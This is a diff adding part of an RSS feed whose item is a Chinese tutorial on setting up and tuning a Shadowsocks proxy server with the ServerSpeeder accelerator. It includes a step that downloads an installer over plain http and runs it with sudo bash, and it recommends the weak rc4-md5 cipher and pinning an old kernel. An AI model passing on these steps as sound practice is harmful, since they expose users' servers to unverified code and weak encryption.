+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;用vim新建&lt;code&gt;shadowsocks.json&lt;/code&gt;文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;vim /etc/shadowsocks.json
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;复制以下内容进去&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{
+    &amp;quot;server&amp;quot;:&amp;quot;0.0.0.0&amp;quot;,
+    &amp;quot;local_address&amp;quot;:&amp;quot;127.0.0.1&amp;quot;,
+    &amp;quot;local_port&amp;quot;:1080,
+    &amp;quot;port_password&amp;quot;:{
+        &amp;quot;10000&amp;quot;:&amp;quot;Password1&amp;quot;,
+        &amp;quot;10001&amp;quot;:&amp;quot;Password2&amp;quot;,
+        &amp;quot;10002&amp;quot;:&amp;quot;Password3&amp;quot;,
+        &amp;quot;10003&amp;quot;:&amp;quot;Password4&amp;quot;
+        },
+        &amp;quot;timeout&amp;quot;: 300,
+        &amp;quot;method&amp;quot;:&amp;quot;rc4-md5&amp;quot;,
+        &amp;quot;fast_open&amp;quot;: true
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;“10000”是指端口，“Password1”是指此端口的密码，均可以随意设置&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;常用 vim 操作自己百度，如果 vim 命令不可用是因为没安装 vim，可以用 vi 替代&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;保存刚才的文档，然后启动 shadowsocks 服务（每次重启服务器后都必须再 次执行下面的命令） ：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ssserver -c /etc/shadowsocks.json -d start
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;锐速优化可选&#34;&gt;锐速优化（可选）&lt;/h1&gt;
+&lt;p&gt;锐速现在最低套餐是 300 元一年，新手不建议使用，如需使用百度锐速官网&lt;/p&gt;
+&lt;h2 id=&#34;更换内核&#34;&gt;更换内核&lt;/h2&gt;
+&lt;h3 id=&#34;查询当前内核&#34;&gt;查询当前内核&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;输入以下命令查询当前内核&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;uname -r
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;安装指定内核&#34;&gt;安装指定内核&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;目前锐速最高支持linux-image-3.13.0-46-generic内核，运行以下命令安装此内核&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;apt-get install linux-image-3.13.0-46-generic
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;卸载其他内核&#34;&gt;卸载其他内核&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;运行命令查询本系统的其他内核&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo dpkg --get-selections | grep linux-image
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;实例&lt;/strong&gt;，查询出有其他5个内核&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;linux-image-3.16.0-30-generic
+linux-image-3.16.0-60-generic
+linux-image-extra-3.16.0-30-generic
+linux-image-extra-3.16.0-60-generic
+linux-image-generic-lts-utopic
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;运行命令卸载其他内核&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo apt-get remove linux-image-3.16.0-30-generic linux-image-3.16.0-60-generic linux-image-extra-3.16.0-30-generic linux-image-extra-3.16.0-60-generic linux-image-generic-lts-utopic
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;删除后执行grub更新和重启&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo update-grub
+sudo reboot now
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;固定内核版本&#34;&gt;固定内核版本&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;防止内核意外升级&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo apt-mark hold linux-image
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;优化内核&#34;&gt;优化内核&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;使用vim打开&lt;code&gt;limits.conf&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;vim /etc/security/limits.conf
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后添加下面语句&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;*    soft    nofile    51200
+*    hard    nofile    51200
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;修改&lt;code&gt;/etc/pam.d/common-session&lt;/code&gt;,加入以下内容&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;session required pam_limits.so
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;修改&lt;code&gt;/etc/profile&lt;/code&gt;,最下面加入以下内容&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ulimit    -SHn    51200
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;修改&lt;code&gt;/etc/sysctl.conf&lt;/code&gt;,加入以下内容&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;fs.file-max = 51200
+net.core.rmem_max = 67108864
+net.core.wmem_max = 67108864
+net.core.netdev_max_backlog = 250000
+net.core.somaxconn = 4096
+net.ipv4.tcp_syncookies = 1
+net.ipv4.tcp_tw_reuse = 1
+net.ipv4.tcp_tw_recycle = 0
+net.ipv4.tcp_fin_timeout = 30
+net.ipv4.tcp_keepalive_time = 1200
+net.ipv4.ip_local_port_range = 10000 65000
+net.ipv4.tcp_max_syn_backlog = 8192
+net.ipv4.tcp_max_tw_buckets = 5000
+net.ipv4.tcp_rmem = 4096 87380 67108864
+net.ipv4.tcp_wmem = 4096 65536 67108864
+net.ipv4.tcp_mtu_probing = 1
+net.ipv4.tcp_congestion_control = hybla
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;保存修改后执行 sysctl -p 使配置生效。 再额外使用一次 sudo reboot now 重启以生效。&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;安装锐速&#34;&gt;安装锐速&lt;/h2&gt;
+&lt;h3 id=&#34;安装&#34;&gt;安装&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;输入以下命令安装锐速：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;wget http ://my.serverspeeder.com/d/ls/serverSpeederInstaller.tar.gz
+tar -xzvf serverSpeederInstaller.tar.gz
+sudo bash serverSpeederInstaller.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;安装过程中依次输入以下命令：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;你的锐速邮箱
+你的锐速密码
+eth0
+1000000
+1000000
+0
+y
+y
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;优化锐速&#34;&gt;优化锐速&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;打开&lt;code&gt;/serverspeeder/etc/config&lt;/code&gt;，编辑如下内容：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;rsc=&amp;quot;1&amp;quot;
+gso=&amp;quot;1&amp;quot;
+maxmode=&amp;quot;1&amp;quot;
+advinacc=&amp;quot;1&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;重启&#34;&gt;重启&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;重启锐速完成优化&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;service serverSpeeder restart
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;开机启动&#34;&gt;开机启动&lt;/h1&gt;
+&lt;h2 id=&#34;添加路径&#34;&gt;添加路径&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;在&lt;code&gt;/etc/init.d&lt;/code&gt;目录下新建&lt;code&gt;ss_start&lt;/code&gt;文件并加入如下内容：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nohup /usr/local/bin/ss-server -c /etc/shadowsocks.json &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在&lt;code&gt;/etc/init.d&lt;/code&gt;目录下新建&lt;code&gt;rs_start&lt;/code&gt;文件并加入如下内容：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/serverspeeder/bin/serverSpeeder.sh start
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;加权限&#34;&gt;加权限&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;chmod +x /etc/init.d/ss_start
+chmod +x /etc/init.d/rs_start
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;加自启&#34;&gt;加自启&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;sudo update-rc.d ss_start defaults 91
+sudo update-rc.d rs_start defaults 91
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;安全措施&#34;&gt;安全措施&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;关闭 ping 功能：&lt;/p&gt;
+&lt;p&gt;根据我的经验，如果不关闭 ping，会经常有黑客试探攻击服务器，所以最好 关闭 ping 服务，只需要每次启动或者重启服务器后执行一行代码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;echo &amp;quot;1&amp;quot; &amp;gt;/proc/sys/net/ipv4/icmp_echo_ignore_all
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;至此，搭建+优化SS全过程已完毕。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
